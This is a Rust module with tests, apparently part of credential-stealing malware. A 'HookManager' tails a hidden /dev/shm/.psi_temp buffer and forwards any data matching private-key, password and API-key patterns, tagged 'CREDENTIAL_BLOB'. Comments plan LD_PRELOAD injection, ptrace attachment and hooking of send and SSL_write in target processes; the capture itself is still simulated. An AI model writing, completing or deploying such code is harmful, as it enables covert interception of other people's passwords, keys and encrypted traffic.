use std::sync::Arc;
use std::sync::atomic::AtomicBool;
use tokio::sync::mpsc;
use regex::Regex;

pub struct HookManager {
    filters: Vec<DataFilter>,
    active: Arc<AtomicBool>,
}

#[derive(Clone)]
struct DataFilter {
    pattern: Regex,
    data_type: String,
}

impl HookManager {
    pub fn new() -> Self {
        // Initialize filters for common data patterns
        let mut filters = Vec::new();
        
        // Private key patterns
        if let Ok(re) = Regex::new(r"-----BEGIN.*PRIVATE KEY-----") {
            filters.push(DataFilter {
                pattern: re,
                data_type: "CREDENTIAL_BLOB".to_string(),
            });
        }
        
        // Password patterns
        if let Ok(re) = Regex::new(r#"(?i)(password|passwd|pwd)\s*[=:]\s*["']?([^"'\s]+)"#) {
            filters.push(DataFilter {
                pattern: re,
                data_type: "CREDENTIAL_BLOB".to_string(),
            });
        }
        
        // API key patterns
        if let Ok(re) = Regex::new(r"(?i)(api[_-]?key|apikey)\s*[=:]\s*([a-zA-Z0-9_-]{20,})") {
            filters.push(DataFilter {
                pattern: re,
                data_type: "CREDENTIAL_BLOB".to_string(),
            });
        }
        
        Self {
            filters,
            active: Arc::new(AtomicBool::new(true)),
        }
    }
    
    pub async fn start_capture(&self, tx: mpsc::UnboundedSender<Vec<u8>>) {
        // Memory-mapped ring buffer for data capture
        let buffer_path = "/dev/shm/.psi_temp";
        
        // In a real implementation, this would:
        // 1. Set up LD_PRELOAD hook for library injection
        // 2. Use ptrace to attach to target process
        // 3. Hook libc functions (fwrite, send, SSL_write)
        // 4. Filter data through patterns
        // 5. Write to ring buffer
        
        // For now, simulate data capture with file monitoring
        self.monitor_file_capture(tx).await;
    }
    
    async fn monitor_file_capture(&self, tx: mpsc::UnboundedSender<Vec<u8>>) {
        use tokio::fs;
        use tokio::io::{AsyncReadExt, AsyncSeekExt};
        
        let buffer_path = "/dev/shm/.psi_temp";
        
        // Create or open the buffer file
        let _ = fs::OpenOptions::new()
            .create(true)
            .read(true)
            .write(true)
            .open(buffer_path)
            .await;
        
        let mut last_pos = 0u64;
        
        while self.active.load(std::sync::atomic::Ordering::Relaxed) {
            if let Ok(mut file) = fs::File::open(buffer_path).await {
                if let Ok(metadata) = file.metadata().await {
                    let current_size = metadata.len();
                    
                    if current_size > last_pos {
                        if let Ok(_) = file.seek(tokio::io::SeekFrom::Start(last_pos)).await {
                            let mut buffer = vec![0u8; (current_size - last_pos) as usize];
                            if let Ok(n) = file.read_exact(&mut buffer).await {
                                if n > 0 {
                                    // Filter data
                                    if let Some(filtered) = self.filter_data(&buffer) {
                                        let _ = tx.send(filtered);
                                    }
                                }
                            }
                        }
                        last_pos = current_size;
                    }
                }
            }
            
            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        }
    }
    
    pub fn filter_data(&self, data: &[u8]) -> Option<Vec<u8>> {
        // Convert to string for pattern matching
        if let Ok(text) = std::str::from_utf8(data) {
            for filter in &self.filters {
                if filter.pattern.is_match(text) {
                    // Found matching data
                    return Some(data.to_vec());
                }
            }
        }
        
        // Also check binary patterns
        None
    }
    
    pub fn stop(&self) {
        self.active.store(false, std::sync::atomic::Ordering::Relaxed);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_hook_manager_new() {
        let manager = HookManager::new();
        assert!(!manager.filters.is_empty());
        assert!(manager.active.load(std::sync::atomic::Ordering::Relaxed));
    }
    
    #[test]
    fn test_filter_data_private_key() {
        let manager = HookManager::new();
        
        let data = b"-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...";
        let result = manager.filter_data(data);
        assert!(result.is_some());
    }
    
    #[test]
    fn test_filter_data_password() {
        let manager = HookManager::new();
        
        let data = b"password=secret123";
        let result = manager.filter_data(data);
        assert!(result.is_some());
    }
    
    #[test]
    fn test_filter_data_api_key() {
        let manager = HookManager::new();
        
        let data = b"api_key=sk_live_1234567890abcdefghijklmnop";
        let result = manager.filter_data(data);
        assert!(result.is_some());
    }
    
    #[test]
    fn test_filter_data_no_match() {
        let manager = HookManager::new();
        
        let data = b"normal text data without sensitive information";
        let result = manager.filter_data(data);
        assert!(result.is_none());
    }
    
    #[test]
    fn test_filter_data_binary() {
        let manager = HookManager::new();
        
        let data = &[0u8, 1u8, 2u8, 3u8, 255u8];
        let result = manager.filter_data(data);
        // Binary data that's not valid UTF-8 should return None
        assert!(result.is_none());
    }
    
    #[test]
    fn test_hook_manager_stop() {
        let manager = HookManager::new();
        assert!(manager.active.load(std::sync::atomic::Ordering::Relaxed));
        
        manager.stop();
        assert!(!manager.active.load(std::sync::atomic::Ordering::Relaxed));
    }
    
    #[tokio::test]
    async fn test_start_capture() {
        let manager = HookManager::new();
        let (tx, mut rx) = mpsc::unbounded_channel();
        
        // Start capture in background
        let manager_clone = HookManager {
            filters: manager.filters.clone(),
            active: manager.active.clone(),
        };
        let handle = tokio::spawn(async move {
            manager_clone.start_capture(tx).await;
        });
        
        // Stop after a short delay
        tokio::time::sleep(tokio::time::Duration::from_millis(50)).await;
        manager.stop();
        
        // Give it time to stop
        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        
        // Cancel the task
        handle.abort();
    }
    
    #[test]
    fn test_filter_data_empty() {
        let manager = HookManager::new();
        let result = manager.filter_data(b"");
        assert!(result.is_none());
    }
    
    #[test]
    fn test_filter_data_password_variations() {
        let manager = HookManager::new();
        
        // Test various password patterns
        assert!(manager.filter_data(b"password=test").is_some());
        assert!(manager.filter_data(b"PASSWORD=test").is_some());
        assert!(manager.filter_data(b"passwd:test").is_some());
        assert!(manager.filter_data(b"pwd='test'").is_some());
    }
    
    #[test]
    fn test_filter_data_api_key_variations() {
        let manager = HookManager::new();
        
        // Test various API key patterns
        assert!(manager.filter_data(b"api_key=sk_live_12345678901234567890").is_some());
        assert!(manager.filter_data(b"API-KEY=test12345678901234567890").is_some());
        assert!(manager.filter_data(b"apikey:abcdefghijklmnopqrstuvwxyz").is_some());
    }
}
